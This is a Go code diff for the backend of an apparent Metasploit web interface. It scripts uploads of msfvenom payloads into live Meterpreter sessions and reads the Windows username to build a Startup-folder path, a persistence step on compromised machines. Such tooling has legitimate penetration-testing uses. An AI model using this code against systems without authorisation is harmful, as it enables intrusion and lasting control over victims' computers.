@@ -8,6 +8,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"strconv"
 	"strings"
 	"time"
@@ -240,36 +241,62 @@ func handleMsfvenomUpload(db *DB) http.HandlerFunc {
 			return
 		}
 
-		uploadCmd := fmt.Sprintf(`sessions -i %s -c "upload %s %s"`, body.MsfSessionID, tmpFile, body.RemotePath)
+		// The msfconsole sessions command does not support -c within an
+		// interactive stdin session.  Send three commands sequentially:
+		//   1. sessions -i <id>   — enter the meterpreter session
+		//   2. upload <src> <dst> — run the upload
+		//   3. background         — return to msfconsole
 		connID, subChan := executor.Subscribe()
 		defer executor.Unsubscribe(connID)
 
-		if err := executor.ExecuteCommand(uploadCmd); err != nil {
-			w.WriteHeader(http.StatusInternalServerError)
-			fmt.Fprintf(w, `{"error":%q}`, err.Error())
+		// Collect output in a goroutine while commands are sent.
+		collected := make(chan []string, 1)
+		go func() {
+			var out []string
+			deadline := time.After(40 * time.Second)
+			idle := time.NewTimer(5 * time.Second)
+			defer idle.Stop()
+			for {
+				select {
+				case line, ok := <-subChan:
+					if !ok {
+						collected <- out
+						return
+					}
+					out = append(out, line)
+					idle.Reset(5 * time.Second)
+				case <-idle.C:
+					collected <- out
+					return
+				case <-deadline:
+					collected <- out
+					return
+				}
+			}
+		}()
+
+		send := func(cmd string) bool {
+			if err := executor.ExecuteCommand(cmd); err != nil {
+				w.WriteHeader(http.StatusInternalServerError)
+				fmt.Fprintf(w, `{"error":%q}`, err.Error())
+				return false
+			}
+			return true
+		}
+
+		if !send(fmt.Sprintf("sessions -i %s", body.MsfSessionID)) {
 			return
 		}
+		time.Sleep(2 * time.Second) // wait for meterpreter prompt
 
-		var lines []string
-		deadline := time.After(30 * time.Second)
-		idle := time.NewTimer(3 * time.Second)
-		defer idle.Stop()
-
-	collect:
-		for {
-			select {
-			case line, ok := <-subChan:
-				if !ok {
-					break collect
-				}
-				lines = append(lines, line)
-				idle.Reset(3 * time.Second)
-			case <-idle.C:
-				break collect
-			case <-deadline:
-				break collect
-			}
+		if !send(fmt.Sprintf(`upload "%s" "%s"`, tmpFile, body.RemotePath)) {
+			return
 		}
+		time.Sleep(4 * time.Second) // wait for upload to finish
+
+		send("background") // return to msfconsole (ignore error)
+
+		lines := <-collected
 
 		type uploadResp struct {
 			Output     string `json:"output"`
@@ -284,5 +311,102 @@ func handleMsfvenomUpload(db *DB) http.HandlerFunc {
 		if data, err := json.Marshal(resp); err == nil {
 			w.Write(data)
 		}
+	}
+}
+
+var winUsernameRe = regexp.MustCompile(`(?i)USERNAME\s*=\s*(\S+)`)
+
+// handleMsfvenomGetWinUsername runs "getenv USERNAME" inside an active Meterpreter
+// session and returns the Windows username so the frontend can build a Startup path.
+func handleMsfvenomGetWinUsername(db *DB) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+
+		sessionID, err := strconv.Atoi(chi.URLParam(r, "id"))
+		if err != nil {
+			w.WriteHeader(http.StatusBadRequest)
+			fmt.Fprint(w, `{"error":"invalid session id"}`)
+			return
+		}
+		claims, err := validateToken(extractToken(r))
+		if err != nil {
+			w.WriteHeader(http.StatusUnauthorized)
+			fmt.Fprint(w, `{"error":"unauthorized"}`)
+			return
+		}
+		if _, err := db.GetSession(sessionID, claims.UserID); err != nil {
+			w.WriteHeader(http.StatusNotFound)
+			fmt.Fprint(w, `{"error":"session not found"}`)
+			return
+		}
+
+		var body struct {
+			MsfSessionID string `json:"msf_session_id"`
+		}
+		if err := parseJSON(r, &body); err != nil || body.MsfSessionID == "" {
+			w.WriteHeader(http.StatusBadRequest)
+			fmt.Fprint(w, `{"error":"msf_session_id required"}`)
+			return
+		}
+
+		executor := GetExecutor(sessionID)
+		if executor == nil {
+			w.WriteHeader(http.StatusConflict)
+			fmt.Fprint(w, `{"error":"Console not initialised — open the Console tab first"}`)
+			return
+		}
+
+		connID, subChan := executor.Subscribe()
+		defer executor.Unsubscribe(connID)
+
+		collected := make(chan []string, 1)
+		go func() {
+			var out []string
+			deadline := time.After(20 * time.Second)
+			idle := time.NewTimer(3 * time.Second)
+			defer idle.Stop()
+			for {
+				select {
+				case line, ok := <-subChan:
+					if !ok {
+						collected <- out
+						return
+					}
+					out = append(out, line)
+					idle.Reset(3 * time.Second)
+				case <-idle.C:
+					collected <- out
+					return
+				case <-deadline:
+					collected <- out
+					return
+				}
+			}
+		}()
+
+		executor.ExecuteCommand(fmt.Sprintf("sessions -i %s", body.MsfSessionID))
+		time.Sleep(2 * time.Second)
+		executor.ExecuteCommand("getenv USERNAME")
+		time.Sleep(2 * time.Second)
+		executor.ExecuteCommand("background")
+
+		lines := <-collected
+
+		username := ""
+		for _, line := range lines {
+			if m := winUsernameRe.FindStringSubmatch(line); m != nil {
+				username = strings.TrimSpace(m[1])
+				break
+			}
+		}
+
+		if username == "" {
+			w.WriteHeader(http.StatusNotFound)
+			fmt.Fprint(w, `{"error":"could not determine USERNAME from session"}`)
+			return
+		}
+
+		data, _ := json.Marshal(map[string]string{"username": username})
+		w.Write(data)
 	}
 }
